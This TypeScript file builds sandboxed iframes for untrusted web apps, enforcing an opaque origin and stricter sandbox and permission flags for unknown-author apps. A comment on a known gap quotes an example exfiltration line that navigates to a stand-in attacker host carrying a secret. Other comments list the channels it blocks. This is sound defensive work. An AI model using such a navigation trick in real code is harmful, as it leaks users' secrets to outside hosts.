/**
 * The single chokepoint for creating **app iframes** (UI_AS_APPS_SPEC §2 / G1 /
 * threat T1).
 *
 * App iframes MUST be opaque-origin: `sandbox="allow-scripts …"` WITHOUT
 * `allow-same-origin`. With `allow-same-origin` alongside `allow-scripts` an app
 * could remove its own sandboxing and reach the parent — the whole capability
 * model collapses. This is the one invariant with no defense-in-depth, so
 * creation is centralized here and the resolved attribute is asserted. Raw
 * `document.createElement('iframe')` for app content elsewhere is forbidden (a
 * greppable CI check), so the verifiable invariant is "every app iframe is born
 * in this factory."
 *
 * Scope: the opaque-origin app iframes (the runtime + static preview clients).
 * The node/nodebox emulator is a different execution model and is intentionally
 * NOT routed through here.
 */

/**
 * The app's resolved trust stance (TRUST_MODES_SPEC §3, R3-194). Only **M3** (a
 * stranger's app — unknown author) changes iframe emission; M0–M2 (kernel /
 * first-party / the user's own / a verified-org's code) keep the exact baseline.
 * Any absent/unknown value is treated as baseline (fail-SAFE: we only ever TIGHTEN
 * on explicit M3, never loosen — R3-195 plan step 1).
 */
export type FrameStance = "M0" | "M1" | "M2" | "M3";

// Baseline app sandbox (M0–M2): the full set a trusted-author app needs
// (value 3). `allow-same-origin` is ABSENT and stays absent (G1/T1).
const APP_SANDBOX_BASELINE =
  "allow-forms allow-modals allow-popups allow-presentation allow-scripts allow-downloads allow-pointer-lock";

// M3 (stranger app) sandbox — the §G1a tightening: baseline MINUS `allow-forms`
// (native form-POST exfil), `allow-popups`/`allow-modals`/`allow-presentation`
// (`window.open(url)` + popup/presentation-URL exfil). KEEP `allow-scripts` (the
// app must still run), `allow-downloads`, `allow-pointer-lock`. This is a STRICT
// SUBSET of the baseline — never adds a flag (the §G1a subset invariant). The
// remaining bulk-egress channels (fetch/XHR/WebSocket/beacon, pixels) are shut by
// the per-frame M3 CSP delivered with the frame's document (R3-195 sandbox repo),
// not by a sandbox flag. `allow-same-origin` remains absent.
const APP_SANDBOX_M3 = "allow-scripts allow-downloads allow-pointer-lock";

// Baseline delegated features (the `allow` / Permissions-Policy attribute).
const APP_ALLOW_BASELINE =
  "accelerometer; camera; encrypted-media; geolocation; gyroscope; hid; microphone; midi; clipboard-read; clipboard-write; xr-spatial-tracking;";

// M3 delegates NOTHING — camera/microphone/geolocation and every other egress- or
// sensor-capable feature is withheld (an empty allowlist ≡ disabled), which also
// denies the WebRTC/getUserMedia surfaces. A strict subset of the baseline.
const APP_ALLOW_M3 = "";

const sandboxAttrFor = (stance?: FrameStance): string =>
  stance === "M3" ? APP_SANDBOX_M3 : APP_SANDBOX_BASELINE;
const allowAttrFor = (stance?: FrameStance): string =>
  stance === "M3" ? APP_ALLOW_M3 : APP_ALLOW_BASELINE;

/** Throw if the iframe would run scripts at a same-origin context (G1/T1). */
export function assertOpaqueOrigin(iframe: HTMLIFrameElement): void {
  const sandbox = iframe.getAttribute("sandbox") ?? "";
  if (/(^|\s)allow-same-origin(\s|$)/.test(sandbox)) {
    throw new Error(
      "Refusing an app iframe with allow-same-origin alongside allow-scripts: " +
        "the sandbox would be void (UI_AS_APPS_SPEC G1/T1).",
    );
  }
}

/**
 * Create an opaque-origin sandboxed iframe for running untrusted app code. `stance`
 * (R3-195) selects the M3-hardened sandbox/allow attributes for a stranger app;
 * absent/M0–M2 emits the exact baseline.
 *
 * SELF-NAVIGATION RESIDUAL (booked, do NOT claim closed — §G1a / TRUST_MODES §6 /
 * finding C1): an M3 frame can still `location = "https://attacker/?d=<secret>"`
 * as a ONE-SHOT `GET`. That channel is unblockable without `allow-top-navigation`
 * gymnastics that break legitimate in-app routing, is browser-parity, and is
 * host-observable (a navigation tripwire is a post-hoc signal, never prevention).
 * This factory contains BULK/streaming egress (fetch, form-POST, popups, pixels);
 * it does not — and cannot — close the single-shot self-nav floor.
 */
export function createSandboxedIframe(
  doc: Document = document,
  stance?: FrameStance,
): HTMLIFrameElement {
  const iframe = doc.createElement("iframe");
  iframe.setAttribute("sandbox", sandboxAttrFor(stance));
  iframe.setAttribute("allow", allowAttrFor(stance));
  assertOpaqueOrigin(iframe);
  return iframe;
}

/**
 * Ensure a (possibly externally-provided) app iframe is opaque-origin: set the
 * sandbox/allow attributes if absent, then assert no `allow-same-origin`. Use
 * this for the case where a host passes in its own iframe element. `stance` selects
 * the M3-hardened attributes when this factory is the one setting them.
 */
export function ensureSandboxed(
  iframe: HTMLIFrameElement,
  stance?: FrameStance,
): void {
  if (!iframe.getAttribute("sandbox")) {
    iframe.setAttribute("sandbox", sandboxAttrFor(stance));
    iframe.setAttribute("allow", allowAttrFor(stance));
  }
  assertOpaqueOrigin(iframe);
}
